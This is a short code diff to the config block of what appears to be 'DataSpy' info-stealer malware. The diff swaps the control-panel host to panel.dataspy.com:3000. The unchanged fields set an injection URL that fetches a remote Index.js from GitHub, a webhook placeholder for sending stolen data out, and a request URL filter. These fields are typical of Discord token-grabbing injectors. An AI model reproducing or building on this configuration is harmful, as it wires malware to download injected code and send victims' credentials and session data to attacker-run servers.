@@ -18,7 +18,7 @@ var config = {
     creator: "%NAME_CREATOR%",
     injection_url: "https://raw.githubusercontent.com/DataSpyGithub/DataSpyGithub/main/Index.js",
     webhook: "%WEBHOOK%",
-    uwu: "https://panel.sordeal.com:3000/",
+    uwu: "https://panel.dataspy.com:3000/",
 
     Filter: {
         "urls": [
